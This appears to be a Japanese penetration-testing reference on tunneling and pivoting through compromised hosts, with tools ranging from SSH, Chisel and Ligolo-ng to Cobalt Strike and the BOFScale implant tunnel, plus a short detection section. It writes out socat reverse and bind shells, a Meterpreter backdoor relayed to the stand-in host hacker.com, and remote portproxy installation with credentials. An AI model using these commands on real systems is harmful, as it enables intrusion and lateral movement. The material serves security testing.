# トンネリングとポートフォワーディング

{{#include ../banners/hacktricks-training.md}}

## Nmapのヒント

> [!WARNING]
> NmapのプロキシサポートはTCP接続に限られ、ping、ポート、OS検出スキャンには影響しません。スキャナーがSOCKSプロキシの背後にある場合は、**ホスト検出を無効にし**（`-Pn`）、**TCP connectスキャン**（`-sT`）を使用してください。<sup>[[5]](#references)</sup>

## **Bash**

**ホスト -> 踏み台 -> 内部A -> 内部B**

最後のコマンドでは、Evil-WinRMの`-u`と`-i`オプションを使ってアカウントとWinRMホストを指定します。WinRMのデフォルトポートは5985です。<sup>[[4]](#references)</sup>

```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```

## **SSH**

OpenSSHは、暗号化チャネル経由でX11接続、任意のTCPポート、Unixドメインソケットを転送できます。<sup>[[6]](#references)</sup>

SSHグラフィカル接続（X）

`-Y`は信頼されたX11転送を有効にし、`-C`は転送データの圧縮を要求します。<sup>[[6]](#references)</sup>

```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```

### Remote Port2Port

SSH Serverで新しいポートを開く --> Other port

Remote（`-R`）ポートフォワーディングはSSHサーバー上でリッスンし、ローカル側に接続します。明示的に指定したbind addressによって、そのリスナーにアクセスできるインターフェースが決まります。<sup>[[6]](#references)</sup>

```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```

### Port2Port

ローカルポート --> 侵害されたホスト (SSH) --> Third_box:Port

ローカル（`-L`）フォワーディングはクライアント側で待ち受け、SSHサーバー側から宛先に接続します。<sup>[[6]](#references)</sup>

```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```

### Port2hostnet (proxychains)

ローカルポート --> 侵害されたホスト (SSH) --> 任意の場所

Dynamic (`-D`) forwarding は、接続がリモート側から開かれるローカル SOCKS4/SOCKS5 listener を作成します。<sup>[[6]](#references)</sup>

```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```

### ProxyJump を使ったマルチホップ

`-J`/`ProxyJump` は、カンマ区切りで指定した1つ以上の踏み台ホストを経由してターゲットに接続します。転送オプションは最終的な SSH 接続に適用されるため、以下の SOCKS リスナーは最初の踏み台ではなく、`internal-target` から接続先にアクセスします。これにより、踏み台にログインして2つ目の SSH クライアントを起動する必要がなくなります。<sup>[[6]](#references)</sup>

```bash
# Reach the final SSH server through two bastions
ssh -J user1@jump1:22,user2@jump2:22 user3@internal-target

# Create a local SOCKS proxy whose connections exit from internal-target
ssh -J user1@jump1,user2@jump2 -N -D 127.0.0.1:1080 user3@internal-target
```

中継マシン固有のオプションは `~/.ssh/config` に記述する必要があります。宛先を対象としたコマンドライン設定は、中継ホストには自動的に適用されません。<sup>[[6]](#references)</sup>

### Reverse Port Forwarding

これは、DMZ を経由して内部ホストからホストへ reverse shell を取得する場合に役立ちます。

サーバーの `GatewayPorts` 設定は、remote forward が loopback 以外に bind できるかどうかを制御します。デフォルトは `no` です。<sup>[[7]](#references)</sup>

```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```

### VPN-Tunnel

このrootベースの例では、両方のホストにトンネルデバイスを作成します。サーバーでtun転送を許可し、選択したアカウントがtunデバイスにアクセスできる必要があります。ここで`root`アカウントを使用する方法の1つは、`PermitRootLogin yes`を設定することです。<sup>[[6]](#references)[[7]](#references)</sup>\
`PermitRootLogin yes`\
`PermitTunnel yes`

```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ip link set tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ip link set tun0 up #Activate the server side network interface
```

サーバー側で転送を有効にする

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```

クライアント側で新しいルートを設定する

```
route add -net 10.0.0.0/16 gw 1.1.1.1
```

> [!NOTE]
> **Security – Terrapin Attack (CVE-2023-48795)**  
> OpenSSH 9.6では、Terrapinによる初期トランスポートの完全性攻撃に対抗するため、strict-KEX拡張が追加されました。可能であれば両方のピアを更新し、古い実装については、転送されたチャネルがバージョンだけで保護されていると決めつけず、ベンダーのガイダンスに従ってください。<sup>[[8]](#references)</sup>

## SSHUTTLE

ホスト経由で、サブネットワーク宛てのすべての**traffic**を**ssh**で**tunnel**できます。\
たとえば、10.10.10.0/24宛てのすべてのtrafficを転送できます。

`sshuttle`はSSH経由の透過プロキシを提供し、以下に示すようにサブネットとカスタムSSHコマンドを指定できます。<sup>[[9]](#references)</sup>

```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```

秘密鍵で接続する

```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```

## Meterpreter

Metasploit の `portfwd` はローカル転送とリモート転送に対応しています。一方、SOCKS proxy module は session routes または `autoroute` と連携することを想定しており、これらの例ではデフォルトで port 1080 をリッスンします。<sup>[[10]](#references)[[11]](#references)[[12]](#references)</sup>

### Port2Port

ローカルポート --> 侵害されたホスト（active session） --> Third_box:Port

```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```

### SOCKS

```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```

別の方法:

```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```

## Cobalt Strike

Cobalt Strike の Beacon は、Beacon 経由で SOCKS4a/SOCKS5 接続を中継できます。`rportfwd` は侵害されたホスト上でポートをバインドし、`rportfwd_local` は Cobalt Strike クライアントから接続先への接続を開始します。<sup>[[13]](#references)[[14]](#references)</sup>

### SOCKSプロキシ

Beacon 経由でトラフィックをルーティングするインターフェース上で、Team Server のポートを開きます。<sup>[[13]](#references)</sup>

```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```

### rPort2Port

> [!WARNING]
> この場合、**portはTeam ServerではなくBeaconホストで開かれ**、トラフィックはTeam Serverに送信され、そこから指定されたhost:portに転送されます。<sup>[[14]](#references)</sup>

```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```

The reverse-forwarding manual では、次の動作が記載されています。<sup>[[14]](#references)</sup>

- Beacon の reverse port forward は、**個々のマシン間で中継するためではなく、Team Server へのトラフィックをトンネルするよう設計されています**。
- トラフィックは、P2P リンクを含め、**Beacon の C2 トラフィック内でトンネルされます**。
- 高位ポートは通常、特権ポートの制限を回避できますが、対象 OS のポリシーや既存のリスナーは引き続き適用されます。

### rPort2Port local

> [!WARNING]
> この場合、**ポートは Team Server ではなく Beacon ホスト上で開かれ**、**トラフィックは Team Server ではなく Cobalt Strike クライアントに送信され**、そこから指定された host:port に送られます。<sup>[[14]](#references)</sup>

```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```

## Tailcat: アカウント不要のユーザー空間TCPフォワーディング

Tailcatは、Tailscaleのコントロールプレーンを使わずに、WireGuard/NATトラバーサル/DERPのデータプレーンを利用します。Tailscaleアカウントも管理者権限も不要で、ホストルートをインストールしたりDNSを変更したりしません。[Tailscale Serve/Funnel](reverse-shells/expose-local-to-the-internet.md#tailscale-funnel--serve)や、プロセス内で動作する[BOfScale tailnet](#bofscale---cdn-fronted-in-process-tailnet)とは異なり、サーバーは *tailcat address* を別の手段で共有します。クライアントはそのアドレスを使って、リモートノードが提供するポートに接続します。<sup>[[62]](#references)</sup>

リモートノードのポート`4444`ですでにTCPサービスが待ち受けている場合は、そこで`serve`を起動し、表示されたアドレスをクライアント側の`forward`に渡します。2つ目のコマンドは、デフォルトで`127.0.0.1:18080`にバインドするため、通常のTCPソケットのみをサポートするローカルプロセスは、そのループバックポートに接続するだけで、Tailcatがトラフィックをリモートポート`4444`へ転送します。<sup>[[62]](#references)</sup> ポート番号はTailcat固有のものではありません。<sup>[[62]](#references)</sup>

```bash
# Remote node with a service on localhost:4444
tailcat serve 4444
# Client node; replace the placeholder with the address printed above
tailcat forward <tc-address> 18080:4444
```

アドレスにはサーバーのWireGuard公開鍵と、現在のリリースではデフォルトで事前共有鍵が含まれます。認証情報として扱ってください。制限のないサーバーは、アドレスを知っているpeerからの接続を受け入れます。一時的なアドレスはサーバーの終了時に使えなくなります。保存された`default`キーがあると、以降の実行でも通常の`serve`で同じアドレスが再利用されるため、起動メッセージを確認し、アドレスが漏れる可能性がある場合は`serve --allow`でクライアントを制限してください。<sup>[[62]](#references)</sup>

接続には直接UDP経路またはDERPリレーを使用できます。これにより専用のC2ドメインは不要になりますが、ネットワーク上の活動が見えなくなるわけではありません。<sup>[[62]](#references)[[63]](#references)</sup>

## BOFScale - CDN-fronted in-process tailnet

[BOFScale](https://github.com/NetSPI/BOFscale)は、TUNドライバーやサービスをインストールせずに、Windows C2 implant内で改変版のTailscale overlayを実行します。3つのコンポーネントは、非同期のCGo `c-shared` `tailscaled` BOF-PE、ローカルAPIと通信する小型のC++ BOF-PE、非同期の`socksportfwd` TCP-to-SOCKS5 bridgeです。<sup>[[53]](#references)[[54]](#references)</sup>

### CDN-compatible TS2021 and DERP

Tailscaleは通常、NoiseベースのTS2021 control channelとDERP relayに、独自のHTTP upgradeを使用します。BOFScaleはこれらのバイトストリームを維持しつつ、RFC 6455 WebSocketで転送します。`Sec-WebSocket-Protocol: ts2021`または`derp`を使用することで、オペレーターが管理するHeadscale/DERP originを、標準のWebSocket upgradeのみを受け付けるCDNの背後に配置できます。パッチ適用済みのクライアントは、HTTP `500`の後にTS2021をWebSocketで再試行し、HTTP `426`の後にDERPを再試行します。また、DERP WebSocket dialerがホストのproxy設定を使用するようにします。BOFは、失敗が確認されている最初の試行をスキップするために`TS_DEBUG_DERP_WS_CLIENT=1`を設定します。<sup>[[53]](#references)[[54]](#references)</sup>

CDNとorigin proxyは、`/ts2021`と`/derp`へのWebSocket upgradeを維持し、`/key`を通常のHTTPとして転送し、リレーセッションが無期限に開いたままになる可能性があるため、内部のread/write timeoutを無効にする必要があります。付属のHeadscale設定では`verify_clients`を有効にし、オペレーターに埋め込まれたDERP mapのみを公開し、Tailscaleが運用するリレーへのfallbackを防ぐため`derp.urls`を空にしています。<sup>[[53]](#references)[[54]](#references)</sup>

### In-process daemon and named-pipe control

上書きされない限り、BOF entry pointは`-tun=userspace-networking`、`-state mem:`、`-no-logs-no-support`を指定して`tailscaled`を起動し、その後UUID名のpipeを作成します。Goのstdout/stderrをOS pipe経由でBeacon output APIにリダイレクトするため、daemonとGo runtime全体はメモリ上に常駐しますが、stateやログはTailscaleディレクトリに書き込まれません。<sup>[[53]](#references)[[54]](#references)</sup>

軽量クライアントは、そのpipeを介してTailscaleのHTTP/1.0 local APIを再現します。daemonの`safesocket`レイヤーがpipe clientを偽装するため、`SECURITY_SQOS_PRESENT | SECURITY_IMPERSONATION`を指定してpipeを開き、`Tailscale-Cap: 125`を送信し、local APIを`up`、`down`、`status`、route advertisement、shutdownの各操作に対応付けます。<sup>[[53]](#references)[[54]](#references)</sup>

> [!WARNING]
> daemonにshutdownを指示した後、手動でmapしたGo BOF-PEをunloadしないでください。runtimeやgarbage collectorのgoroutineが、loaderによってunmapされたメモリから実行を続ける可能性があります。`tailscaled`は使い捨てのprocessで実行し、最終的なcleanupではそのprocessを終了してください。<sup>[[54]](#references)</sup>

### Bridge host-originated traffic through userspace SOCKS5

受信tailnet接続と広告されたsubnet routeはuserspace network stack内で動作しますが、侵害されたホスト上の通常のprocessにはoverlayへのOS routeがありません。そのため`socksportfwd`は、victim側から接続できるTCP portで待ち受け、daemonの`0.0.0.0:1080` listenerとSOCKS5 `NO AUTH`をネゴシエートし、tailnet宛先への`CONNECT`を発行して、両方向に非同期で中継します。宛先がMagicDNS名の場合は`ATYP_DOMAIN`を使用するため、Windows resolverに名前を公開せずに`tailscaled`が名前を解決します。<sup>[[53]](#references)[[54]](#references)</sup>

以下に最小限のオペレーター手順を示します。このCDN設計を通過できないため、オペレーターノードとimplantの両方でパッチ適用済みのbinaryを使用する必要があります。<sup>[[53]](#references)[[54]](#references)</sup>

```bash
HEADSCALE_HOSTNAME=<cdn-hostname> docker compose up
# Start tailscaled as an asynchronous BOF and copy its printed pipe name
tailscaled
tailscale --socket '\\.\pipe\<uuid>' up --auth-key <key> --login-server https://<cdn-hostname>
tailscale --socket '\\.\pipe\<uuid>' set --advertise-routes <victim-cidr>
socksportfwd --t <operator-magicdns-name> --tp 8888 --p 8888
```

ローカルフォワードを使うと、見かけ上の認証リスナーとリレーツールを分離できます。マシンに侵害済みホストのバインド済みポートへ認証させ、tailnet経由で`ntlmrelayx`に転送し、さらにAD CS、LDAP、HTTP、SMB、またはその他の互換性のあるターゲットへリレーします。脆弱性固有の各段階については、[WebDAV NTLM coercion](../windows-hardening/ntlm/places-to-steal-ntlm-creds.md#webdav-auth-coercion--credential-validation-via-davclntdlldavsetcookie)および[ESC8 relay to AD CS](../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints--esc8)を参照してください。BOFScaleはトランスポートにすぎません。<sup>[[54]](#references)</sup>

### 検知

単独の弱い兆候ではなく、複数の兆候の組み合わせを探します。通常Goベースではないプロセス内のGoランタイム、緩いSDDL `D:(A;;GA;;;WD)`を持つUUIDパイプ、予期しない`0.0.0.0:1080` SOCKSリスナー、CDNアドレスへの長時間TLS WebSocket接続です。TLSインスペクションでは、所有プロセスが許可された`tailscaled`サービスではない場合に、`Sec-WebSocket-Protocol: derp`または`ts2021`を検知します。リポジトリの`bofscale.yar`ルールは、3つのBOF-PEコンポーネントすべてのメモリシグネチャを提供します。<sup>[[53]](#references)[[54]](#references)</sup>

## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

このプロジェクトは、`tunnel.aspx`、`tunnel.ashx`、`tunnel.jsp`、`tunnel.php`などのWebトンネルエンドポイントを提供します。ローカルプロキシを起動する前に、サポートされているエンドポイントを1つアップロードしてください。<sup>[[15]](#references)</sup>

```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```

## Chisel

[https://github.com/jpillora/chisel](https://github.com/jpillora/chisel) の releases page からダウンロードできます。\
Chisel は SSH で保護された接続を使用して、HTTP 経由で TCP/UDP トラフィックを転送します。互換性のある client/server ビルドを使用し、選択したリリースのコマンド構文を確認してください。<sup>[[16]](#references)</sup>

### socks

```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```

### Port forwarding

```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```

## wstunnel

[`wstunnel`](https://github.com/erebe/wstunnel) は、WebSocket、HTTP/2、または WebTransport（QUIC 上の HTTP/3）を介して静的または動的なフォワードを転送します。現在のビルドは、TCP、UDP、Unix ソケット、stdio、SOCKS5、HTTP プロキシ、および Linux の透過プロキシリスナーを、フォワードモードとリバースモードの両方でサポートしています。<sup>[[52]](#references)</sup>

### Reverse SOCKS5 pivot

攻撃者側でサーバーを起動し、`-R` を使ってピボットから外向きに接続させます。この方向では、SOCKS5 リスナーは **サーバー** 上に作成され、要求された接続は **クライアント／ピボット** のネットワークから開始されます。<sup>[[52]](#references)</sup>

```bash
# Attacker: use a certificate valid for pivot.example
wstunnel server --tls-certificate cert.pem --tls-private-key key.pem wss://0.0.0.0:443

# Pivot: expose an attacker-side, loopback-only SOCKS5 listener
wstunnel client --tls-verify-certificate \
  -R 'socks5://127.0.0.1:1080' wss://pivot.example:443

# Attacker
proxychains nmap -n -Pn -sT -p 445,3389 10.10.10.0/24
```

Reverse static forward は同じ方向を使用します。たとえば、次の設定では、pivot から到達できる `10.10.10.20:445` を、攻撃者側の loopback ポート `8445` で公開します:<sup>[[52]](#references)</sup>

```bash
wstunnel client --tls-verify-certificate \
  -R 'tcp://127.0.0.1:8445:10.10.10.20:445' wss://pivot.example:443
```

### Egressとトランスポートの詳細

- 明示的なHTTP proxyを経由するには、clientに`-p http://user:pass@proxy:8080`を追加します。`curl`などのclientでは`socks5h://127.0.0.1:1080`を使用するか、アプリケーションでproxied DNSを有効にします。これにより、内部名はローカルresolverに漏れるのではなく、tunnelの先で名前解決されます。<sup>[[52]](#references)</sup>
- `wss://`はTLSで保護されたWebSocketを選択します。`https://` clientはHTTP/2を選択しますが、reverse proxy/CDNによるbufferingやHTTP/1への変換は、双方向streamを壊すことがよくあります。このモードをテストする際は、wstunnel serverを直接公開してください。<sup>[[52]](#references)</sup>
- `wts://`はQUIC上のWebTransportを選択します。`--enable-webtransport`（または`wts://`のlisten URL）を指定してserverを起動し、listen portでUDPを許可してください。このモードは、TCPを転送する従来型のHTTP `CONNECT` proxyを通過できません。<sup>[[52]](#references)</sup>

> [!WARNING]
> upstream projectは、内蔵のself-signed certificateをプライバシー保護として扱わないよう警告しています。有効なカスタムcertificateと`--tls-verify-certificate`（またはmTLS）を使用し、リモートアクセスが意図的でない限りproxy listenerをloopbackに限定してください。機密性が重要な場合は、すでにセキュアなprotocolをtunnelしてください。<sup>[[52]](#references)</sup>

## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

Ligolo-ngのquickstartでは、proxy上のTUN interface、agentのcertificate fingerprint検証、およびtunnel経由のnetworkへのroute設定について説明しています。<sup>[[17]](#references)</sup>

### Tunneling

```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```

### Agentのバインドとリスニング

Ligolo-ngでは、agent上にlistenerを追加してproxy側のアドレスへ転送でき、予約済みの`240.0.0.0/4`範囲をルーティングしてagentローカルのサービスに到達できます。<sup>[[18]](#references)[[19]](#references)</sup>

```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```

### Agentのローカルポートへのアクセス

```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```

## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Rpivotは被害者側からリバーストンネルを開始し、攻撃者のループバックアドレス上にSOCKS4プロキシを公開します。READMEには、NTLMプロキシの認証情報とハッシュのオプションについても記載されています。<sup>[[20]](#references)</sup>

```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```

**NTLM proxy 経由のピボット**

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```

## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

Socatは`TCP-LISTEN`、`EXEC`、`SOCKS4A`、`OPENSSL`、`PROXY`などのアドレスタイプを組み合わせます。以下の例では、ドキュメントに記載されたこれらのエンドポイントを組み合わせています。<sup>[[21]](#references)</sup>

### Bind shell

```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```

### Reverse shell

```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```

### Port2Port

```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```

### socks経由のPort2Port

```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```

### SSL Socat経由のMeterpreter

```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```

socat のドキュメントに記載されている `PROXY` アドレスタイプを使い、被害者のコンソールで最後の行の代わりに次の行を実行すると、**認証不要のプロキシ**を経由できます。<sup>[[21]](#references)</sup>

```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```

[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL Socat トンネル

**/bin/sh console**

クライアントとサーバーの両方で証明書を作成します。

```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```

### Remote Port2Port

ローカルの SSH ポート（22）を攻撃者ホストの 443 ポートに接続する。

```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```

## Plink.exe

PlinkはPuTTYのコマンドライン接続ツールで、`ssh`と同様のSSH forwardingオプションを備えています。<sup>[[22]](#references)</sup>

SSHポートには大文字の`-P`を使用します。`-pw`は互換性のために残されていますが、プロセス一覧にパスワードが表示されるため、可能であれば鍵認証または`-pwfile`を使用してください。<sup>[[22]](#references)[[23]](#references)</sup>

このバイナリは被害者側で実行され、SSHクライアントとして動作するため、reverse connection用にSSHサービスとポートを開放します。以下では`-R`を使って、ローカルからアクセス可能なポートを攻撃者のマシンに転送しています。<sup>[[22]](#references)</sup>

```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-P <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-P 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```

## Windows netsh

### Port2Port

永続的な `portproxy` ルールを作成または変更するときは、ホストが必要とする権限を持つコンテキストを使用してください。Microsoft のドキュメントには、以下で使用する `v4tov4` の追加、表示、削除の形式が記載されています。<sup>[[24]](#references)</sup>

```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```

### スケジュールタスク経由で`portproxy`をデプロイする

管理者資格情報が利用できる場合、リモートのタスクスケジューラを実行して、専用のリレーをアップロードせずにネイティブの転送ルールをインストールできます。たとえば、[Impacket `atexec`](../windows-hardening/lateral-movement/atexec.md)を使うと、pivotをTCP/443で待ち受けさせ、接続を内部のSMBサービスに中継できます。<sup>[[57]](#references)[[58]](#references)</sup>

```bash
atexec.py 'DOMAIN/USER:PASSWORD'@<PIVOT> \
  'netsh interface portproxy add v4tov4 listenport=443 connectaddress=10.0.12.101 connectport=445'
```

このルールは永続するため、`netsh interface portproxy show v4tov4` で列挙し、テスト後に明示的に削除してください。`portproxy` が提供するのは転送機能だけです。待ち受けポートを許可するには、ホストのファイアウォールも設定する必要があります。<sup>[[24]](#references)</sup>

## SocksOverRDP & Proxifier

**システムへの RDP アクセスが必要です**。\
ダウンロード:

SocksOverRDP は Remote Desktop Dynamic Virtual Channels を使って、既存の RDP セッション経由で SOCKS5 接続を転送します。クライアントプラグインは `127.0.0.1:1080` で待ち受け、サーバーコンポーネントは RDP 接続先で実行されます。<sup>[[25]](#references)</sup>

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - このツールは、Windows の Remote Desktop Service 機能に含まれる `Dynamic Virtual Channels` (`DVC`) を使用します。DVC は**RDP 接続経由でパケットをトンネリング**する役割を担います。
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

クライアントコンピューターで、次のように **`SocksOverRDP-Plugin.dll`** を読み込みます。

```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```

**`mstsc.exe`** を使って **RDP** 経由で **victim** に**接続**できるようになりました。**SocksOverRDP plugin が有効**であり、**127.0.0.1:1080** で**待ち受ける**ことを示す **prompt** が表示されるはずです。

**RDP** 経由で**接続**し、victim machine に `SocksOverRDP-Server.exe` バイナリをアップロードして実行します：

```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```

次に、攻撃者側のマシンでポート1080がリッスンしていることを確認します。

```
netstat -antb | findstr 1080
```

これで [**Proxifier**](https://www.proxifier.com/) を使い、トラフィックをそのポート経由でプロキシできます。<sup>[[26]](#references)</sup>

### RDP 仮想チャネルのハンティング

[`rdp2tcp`](../network-services-pentesting/pentesting-rdp.md#rdp-virtual-channel-tunneling) も RDP 仮想チャネルを使うトンネルです。デフォルトのチャネル名は `rdp2tcp` ですが、オペレーターは別の名前を選択できます。<sup>[[56]](#references)</sup> チャネルの作成と終了は、`Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational` にイベント ID **132** および **148** として記録されます。`rdp2tcp` や、まれなチャネル名またはランダムなチャネル名を探し、`XPSRD`、`cliprdr`、`Microsoft::Windows::RDS::DisplayControl` などの想定されるチャネルと比較します。<sup>[[58]](#references)</sup>

## Windows GUI アプリをプロキシ経由で通信させる

[**Proxifier**](https://www.proxifier.com/) を使うと、Windows GUI アプリがプロキシ経由で通信するように設定できます。<sup>[[26]](#references)</sup>\
**Profile -> Proxy Servers** で、SOCKS サーバーの IP とポートを追加します。\
**Profile -> Proxification Rules** で、プロキシ経由で通信させるプログラム名と、対象とする IP への接続を追加します。Proxifier のルールでは、アプリケーション、接続先ホスト、ポートを条件として指定できます。<sup>[[27]](#references)</sup>

## NTLM プロキシ経由のトンネル

